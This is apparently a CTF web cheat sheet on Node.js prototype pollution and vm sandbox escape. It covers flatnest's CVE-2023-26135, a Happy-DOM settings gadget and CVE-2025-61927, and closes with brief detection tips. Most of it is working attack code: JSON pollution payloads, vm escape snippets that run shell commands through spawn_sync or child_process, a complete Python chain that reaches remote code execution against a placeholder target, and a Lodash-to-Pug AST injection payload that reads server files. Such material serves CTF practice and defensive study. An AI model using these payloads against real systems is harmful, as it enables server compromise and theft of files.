# CTF Web - Node.js Prototype Pollution & VM Escape

## Table of Contents
- [Prototype Pollution Basics](#prototype-pollution-basics)
  - [Common Vectors](#common-vectors)
  - [Known Vulnerable Libraries](#known-vulnerable-libraries)
- [flatnest Circular Reference Bypass (CVE-2023-26135)](#flatnest-circular-reference-bypass-cve-2023-26135)
- [Gadget: Library Settings via Prototype Chain](#gadget-library-settings-via-prototype-chain)
- [Node.js VM Sandbox Escape](#nodejs-vm-sandbox-escape)
  - [ESM-Compatible Escape (CVE-2025-61927)](#esm-compatible-escape-cve-2025-61927)
  - [CommonJS Escape](#commonjs-escape)
  - [Why `document.write` Matters for Happy-DOM](#why-documentwrite-matters-for-happy-dom)
- [Full Chain: Prototype Pollution to VM Escape RCE (4llD4y)](#full-chain-prototype-pollution-to-vm-escape-rce-4lld4y)
- [Lodash Prototype Pollution to Pug AST Injection (VuwCTF 2025)](#lodash-prototype-pollution-to-pug-ast-injection-vuwctf-2025)
- [Affected Libraries](#affected-libraries)
- [Detection](#detection)

---

## Prototype Pollution Basics

JavaScript objects inherit from `Object.prototype`. Polluting it affects all objects:
```javascript
Object.prototype.isAdmin = true;
const user = {};
console.log(user.isAdmin); // true
```

### Common Vectors
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a.__proto__.isAdmin": true}
```

### Known Vulnerable Libraries
- `flatnest` (CVE-2023-26135) — `nest()` with circular reference bypass
- `merge`, `lodash.merge` (old versions), `deep-extend`, `qs` (old versions)

---

## flatnest Circular Reference Bypass (CVE-2023-26135)

**Vulnerability:** `insert()` blocks `__proto__`/`constructor`, but `seek()` (resolves `[Circular (path)]` values) has NO such checks.

**Code flow:**
1. `nest(obj)` iterates keys
2. Value matching `[Circular (path)]` → calls `seek(nested, path)`
3. `seek()` freely traverses `constructor.prototype` → returns `Object.prototype`
4. Subsequent keys write directly to `Object.prototype`

**Exploit:**
```json
POST /config
{
  "x": "[Circular (constructor.prototype)]",
  "x.settings.enableJavaScriptEvaluation": true
}
```

**Note:** 1.0.1 "fix" only guards `insert()`, not `seek()`. Completely unpatched.

---

## Gadget: Library Settings via Prototype Chain

**Pattern:** Library reads optional settings from options object. Caller doesn't provide settings → falls through to `Object.prototype`.

**Happy-DOM example (v20.x):**
```javascript
// Window constructor:
constructor(options) {
  const browser = new DetachedBrowser(BrowserWindow, {
    settings: options?.settings  // options = { console }, no own 'settings'
    // With pollution: Object.prototype.settings = { enableJavaScriptEvaluation: true }
  });
}
```

---

## Node.js VM Sandbox Escape

**`vm` is NOT a security boundary.** Objects crossing the boundary maintain references to host context.

### ESM-Compatible Escape (CVE-2025-61927)
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({
  file: "/bin/sh",
  args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [
    { type: "pipe", readable: true, writable: false },
    { type: "pipe", readable: false, writable: true },
    { type: "pipe", readable: false, writable: true }
  ]
});
const output = Buffer.from(result.output[1]).toString();
```

### CommonJS Escape
```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("id").toString();
```

### Why `document.write` Matters for Happy-DOM
`document.write()` creates parser with `evaluateScripts: true` → scripts are NOT marked with `disableEvaluation`. Only remaining check is `browserSettings.enableJavaScriptEvaluation` (bypassed via pollution).

---

## Full Chain: Prototype Pollution to VM Escape RCE (4llD4y)

**Architecture:**
1. Pollute `Object.prototype.settings` to enable JS eval in Happy-DOM
2. Submit HTML with `<script>` via `document.write()` (which sets `evaluateScripts: true`)
3. Script executes in VM, escapes via `this.constructor.constructor`, gets RCE

**Complete exploit:**
```python
import requests
TARGET = "http://target:3000"

# Step 1: Pollution via flatnest circular reference
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# Step 2: RCE via VM escape in rendered HTML
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:false},
          {type:"pipe",readable:false,writable:true},
          {type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""
r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
print(r.text.split("<title>")[1].split("</title>")[0])
```

---

---

## Lodash Prototype Pollution to Pug AST Injection (VuwCTF 2025)

**Vulnerable:** Lodash < 4.17.5 `_.merge()` allows prototype pollution via `constructor.prototype`.

**Pug template engine gadget:** Pug looks up `block` property on AST nodes. If a node doesn't have its own `block`, JS traverses the prototype chain → finds polluted `Object.prototype.block`.

**Payload:**
```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
        "val": "x"
      }
    }
  },
  "word": "exploit"
}
```

**Delivery:** Base64-encode the JSON, send as `?data=<encoded>`.

**How it works:**
1. `_.merge()` on user input sets `Object.prototype.block` to malicious AST node
2. Pug template compilation checks `node.block` on every node
3. Nodes without own `block` inherit from prototype → finds injected Text node
4. `type: "Text"` with `line:` payload injects code during template compilation
5. Code executes server-side, reads flag

**Detection:** `lodash` < 4.17.5 in `package.json` + Pug/Jade template engine.

---

## Affected Libraries
- **happy-dom** < 20.0.0 (JS eval enabled by default), 20.x+ (if re-enabled via pollution)
- **vm2** (deprecated)
- **realms-shim**
- **lodash** < 4.17.5 (`_.merge()` prototype pollution)

## Detection
- `flatnest` in `package.json` + endpoints calling `nest()` on user input
- `happy-dom` or `jsdom` rendering user-controlled HTML
- Any `vm.runInContext`, `vm.Script` usage
